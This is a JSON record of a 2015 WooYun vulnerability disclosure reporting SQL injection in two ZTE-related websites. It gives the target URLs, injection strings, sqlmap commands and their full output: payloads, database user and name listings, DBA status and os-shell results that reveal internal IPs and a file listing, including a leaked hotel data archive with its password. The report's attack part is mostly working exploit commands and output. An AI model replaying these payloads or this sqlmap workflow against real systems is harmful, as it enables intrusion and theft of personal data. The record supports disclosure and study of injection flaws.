{"id": 80797, "wybug_id": "wooyun-2015-0155134", "wybug_title": "中兴多个SQL注入打包提交(显错注入\\DBA权限\\150个数据库)", "wybug_corp": "中兴通讯股份有限公司", "wybug_author": "harbour_bin", "wybug_date": "2015-11-23 10:14", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： RT 详细说明：  1、\nhttp://www.zte-v.com.cn/Plus/SubForm.aspx?FID=2&NodeID=35\n显错注入\nhttp://www.zte-v.com.cn/Plus/SubForm.aspx?FID=2&NodeID=35%20and%201=@@version版本:Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) Jul  9 2008 14:17:44 Copyright (c) 1988-2008 Microsoft Corporation Enterprise Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1)http://www.zte-v.com.cn/Plus/SubForm.aspx?FID=2&NodeID=35%20and%201=user用户名:sql_zfkj2014http://www.zte-v.com.cn/Plus/SubForm.aspx?FID=2&NodeID=35%20and%201=db_name()数据库:zhongxingchangtian\nSqlMap跑一下: \nD:\\Python>python sqlmap\\sqlmap.py -u \"http://www.zte-v.com.cn/Plus/SubForm.aspx?FID=2&NodeID=35\" --dbs --users --is-dba[*] starting at 09:20:24[09:20:24] [INFO] resuming back-end DBMS 'microsoft sql server'[09:20:24] [INFO] testing connection to the target URL[09:20:25] [WARNING] reflective value(s) found and filtering outsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: NodeID (GET)    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: FID=2&NodeID=35 AND 3907=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (3907=3907) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(98)+CHAR(113)))---[09:20:25] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008[09:20:25] [INFO] testing if current user is DBAcurrent user is DBA:    False[09:20:25] [INFO] fetching database users[09:20:25] [INFO] the SQL query used returns 2 entries[09:20:25] [INFO] resumed: sa[09:20:25] [INFO] resumed: sql_zfkj2014database management system users [2]:[*] sa[*] sql_zfkj2014[09:20:25] [INFO] fetching database names[09:20:25] [INFO] the SQL query used returns 129 entriesavailable databases [129]:[*] aolanduo[*] BDQN_cn[*] chengjumeng[*] chengkaijianzhu[*] chengmingshi[*] chengxiangyitihua[*] cjt[*] CJZFSql[*] collage[*] Curative[*] daikuan[*] daoerdun[*] DFS_SALES_SYSTEM[*] DFS_WLDDJS[*] dfsahhygl[*] dhlgclkx[*] dishuiju[*] donghualigonghuaxue[*] dongshengzhongzhu[*] DT_hr[*] DT_sys[*] dtle[*] fenghuang[*] FindDemo[*] GuiHuaSheJi[*] guozhiwjj[*] haobang[*] haohanguanwang[*] helafushi[*] hengzhilaowu[*] hongrunhuagong[*] huazhong[*] HuaZhongJiaoTong[*] hxtx580[*] jiangxiluohekeji[*] jiankangguoji[*] jidianweiwang[*] jingpinkecheng[*] JingYinJiaoYu[*] jinpaizhoupu[*] jiuxinzhubao[*] jiuzhongyuantaoci[*] jxpufa[*] jxsifa[*] kangsheng[*] kaoshi[*] kehuanshiye[*] kongtiao[*] kongtiao7[*] kunyuanduanxinpingtai[*] kunyuanduanxinpingtai_1[*] LC_MTF_DATA[*] LEDa1[*] LEDb[*] lianjing[*] liansi[*] loushanglou[*] lsfwq[*] lvdu[*] master[*] MeiRongMeiFa[*] message[*] model[*] msdb[*] nanchangzongfuwuqu[*] nchkyyxy[*] ncjjzxw[*] NongGongDang[*] NPSMSPlatform[*] OAManage[*] poyangfuwuqu[*] pushikeji[*] qishishengwu[*] Recovered_changjiangsike[*] Recovered_lingsuyaoye[*] ReportServer[*] ReportServerTempDB[*] shanggaotongxun[*] shekewang[*] shengnvzizhongzhuan[*] shinianshijue[*] shuguangjituan[*] shuilishuidian[*] shuilishuidianyw[*] shuiwujituan[*] shunshengjiangong[*] smart[*] StudentFrance[*] taiguoborendx[*] tempdb[*] tfr245077[*] Tour1[*] Tour2[*] UFDATA_001_2014[*] UFDATA_001_2015[*] UFDATA_002_2015[*] UFDATA_800_2014[*] UFDATA_800_2015[*] UFData_998_2012[*] UFData_999_2011[*] UfNote_001_2015[*] UfNoteSys[*] UFSub[*] UFSystem[*] wanxiang[*] weishengxinxi[*] wit_oa[*] wuliyf[*] xifuhui[*] xinxiwang[*] XinXiWang2[*] xlzxyzbg[*] yangzixiang[*] Yd[*] Yd1[*] ynk[*] yuanrenshequ[*] yuansuhunli[*] yumingqiangzhu1[*] zfkj_doc[*] zfkj_oa[*] zfkj_sys[*] ZFKJ_ZHJJ[*] zhengzhongtang[*] zhongxingchangtian[*] ZHYQ[*] zmbg[*] Zufeng_HuaKai[*] 网站保姆\n129个数据库2、\nhttp://www.ztehotel.com/mobile/mhotelgen.aspx?id=ZTE002\n盲注\nhttp://www.ztehotel.com/mobile/mhotelgen.aspx?id=ZTE002%27%20and%20len(user)=3%20and%201=1--http://www.ztehotel.com/mobile/mhotelgen.aspx?id=ZTE002%27%20and%20len(db_name())=7%20and%201=1--\n这个以前有人交过了, 没有修复,不是很重视啊\nD:\\Python>python sqlmap\\sqlmap.py -u \"http://www.ztehotel.com/mobile/mhotelgen.aspx?id=ZTE002\" --dbs --users --is-dba[*] starting at 17:28:08[17:28:08] [INFO] resuming back-end DBMS 'microsoft sql server'[17:28:08] [INFO] testing connection to the target URL[17:28:10] [WARNING] reflective value(s) found and filtering outsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=ZTE002' AND 6106=6106 AND 'mUYy'='mUYy    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: id=ZTE002';WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=ZTE002' WAITFOR DELAY '0:0:5'--    Type: UNION query    Title: Generic UNION query (NULL) - 5 columns    Payload: id=-9839' UNION ALL SELECT NULL,CHAR(113)+CHAR(112)+CHAR(113)+CHAR(122)+CHAR(113)+CHAR(113)+CHAR(82)+CHAR(82)+CHAR(112)+CHAR(70)+CHAR(69)+CHAR(67)+CHAR(70)+CHAR(71)+CHAR(118)+CHAR(113)+CHAR(122)+CHAR(120)+CHAR(112)+CHAR(113),NULL,NULL,NULL-----[17:28:10] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2005[17:28:10] [INFO] testing if current user is DBAcurrent user is DBA:    True[17:28:10] [INFO] fetching database users[17:28:10] [INFO] the SQL query used returns 5 entries[17:28:10] [INFO] resumed: ADO[17:28:10] [INFO] resumed: ATTENDANCE[17:28:10] [INFO] resumed: saa[17:28:10] [INFO] resumed: saa[17:28:10] [INFO] resumed: ztedatabase management system users [4]:[*] ADO[*] ATTENDANCE[*] saa[*] zte[17:28:10] [INFO] fetching database names[17:28:10] [INFO] the SQL query used returns 22 entriesavailable databases [21]:[*] DotNetCms[*] hotelplan[*] hr[*] hrTest[*] Lsmis_nanJing[*] Lsmis_shangHai[*] Lsmis_xiAn[*] master[*] model[*] msdb[*] MyPhoto[*] New iCall[*] OfficeAnywhere[*] Repertory[*] ReportServer[*] ReportServerTempDB[*] SMS_Mail[*] SSMISDIYDB[*] tempdb[*] TYCRM[*] XL_Attendance\nDBA权限\nos-shell> ipconfigcommand standard output:---Windows IP ConfigurationEthernet adapter 本地连接 4:   Connection-specific DNS Suffix  . :   IP Address. . . . . . . . . . . . : 10.66.1.188   Subnet Mask . . . . . . . . . . . : 255.255.192.0   Default Gateway . . . . . . . . . : 10.66.1.3---\n网站目录, 应该可以shell的, 不慢慢找了\ncommand standard output:--- 驱动器 G 中的卷没有标签。 卷的序列号是 6858-E60F g:\\ 的目录2015-03-28  10:07    <DIR>          360Downloads2013-10-10  08:53    <DIR>          arswp32011-12-07  16:48    <DIR>          DJKeygoe2013-06-08  18:09    <DIR>          DotNetCms2013-09-22  04:26         4,645,268 DotNetCms.rar2014-08-14  08:12    <DIR>          DVSDAT2015-03-18  09:10    <DIR>          faduanxin2013-09-22  04:26           412,188 faduanxin.rar2013-01-17  17:10    <DIR>          hotelplan2013-09-22  04:21         3,764,416 hotelplan.rar2011-08-02  15:56    <DIR>          iCall Setup2013-05-07  11:29             7,358 logo.ico2013-03-13  15:56    <DIR>          nanJing2014-12-05  09:29         1,258,179 nanJing20141205.rar2014-08-11  10:16    <DIR>          OANetdisk2012-06-01  16:55    <DIR>          Office2007 Professional_简体中文专业版_微软最新的office系列2013-10-15  12:37    <DIR>          OfficeAnywhere2013-09-06  14:19    <DIR>          OfficeAnywhere 开发用2013-06-14  11:14    <DIR>          OfficeAnywhere2013-6-142013-12-12  14:52     2,668,474,968 OfficeAnywhere2013年12月12日143818.rar2014-12-05  09:42     2,697,482,797 OfficeAnywhere20141205.rar2013-05-17  11:21    <DIR>          OfficeAnywhere5-172013-05-21  19:04    <DIR>          OfficeAnywhere考勤修改2013-03-21  10:21    <DIR>          pos基础环境2014-01-22  18:44    <DIR>          Program Files2013-10-10  08:53    <DIR>          rsc32013-05-17  11:33    <DIR>          shangHai2014-12-05  09:29         1,434,263 shangHai20141205.rar2013-09-10  10:09        38,435,064 sogou_explorer_4.1_0826.exe2012-08-08  14:44    <DIR>          SSSoft2013-05-07  11:51       390,704,410 SW_CD_Visio_Pro_2007.7z2013-09-13  14:34    <DIR>          sybase_dll2013-09-13  14:32           221,923 sybase_dll.rar2013-03-21  17:02    <DIR>          WebSendMsg2013-09-21  20:58    <DIR>          WebSite2014-12-05  09:28         1,433,418 WebSite20141205.rar2013-04-18  08:42    <DIR>          WebSite82015-01-05  11:00    <DIR>          WindowsApplication12013-09-22  02:27         1,512,925 WindowsApplication1.rar2013-05-31  15:17    <DIR>          xiAn2014-12-05  09:29         1,434,958 xiAn20141205.rar2013-04-16  11:12    <DIR>          youxiangdizhi2013-04-16  11:15       294,752,939 youxiangdizhi.rar2013-06-19  18:44     1,240,469,589 youxiangdizhi2013年6月19日183847.rar2015-03-18  19:44    <DIR>          ztehoteloa2013-09-22  04:26         1,238,502 ztehoteloa.rar2013-10-22  10:28    <DIR>          [fuliba.net]某酒店2000W数据(解压密码：sjisauisa是就数据8很舒适好sjjss)(20131021234529)2013-10-22  09:47     1,834,815,332 [fuliba.net]某酒店2000W数据(解压密码：sjisauisa是就数据8很舒适好sjjss)(20131021234529).rar2013-05-31  15:44    <DIR>          仓库系统2013年5月31日修改前2013-03-05  21:17    <DIR>          和泰报表勿动2013-04-08  08:48           159,350 和泰报表勿动.rar2013-08-05  11:57             2,556 在指定位置添加点对象.htm2013-08-05  11:57    <DIR>          在指定位置添加点对象_files2014-11-18  10:32    <DIR>          官网2013-10-10  08:53    <DIR>          恶意软件清理助手 v2.822013-02-18  08:49            12,741 截图00.jpg---\n   漏洞证明：  \nhttp://www.zte-v.com.cn/Plus/SubForm.aspx?FID=2&NodeID=35\n\n\n\n\n\n\n\nhttp://www.ztehotel.com/mobile/mhotelgen.aspx?id=ZTE002\n\n\nPS：具体数据不跑了, 危害还是比较大的; 如果危害不够, 可以补充   修复方案：  过滤   版权声明：转载请注明来源 harbour_bin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-11-23 14:31 厂商回复： 感谢提交～ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}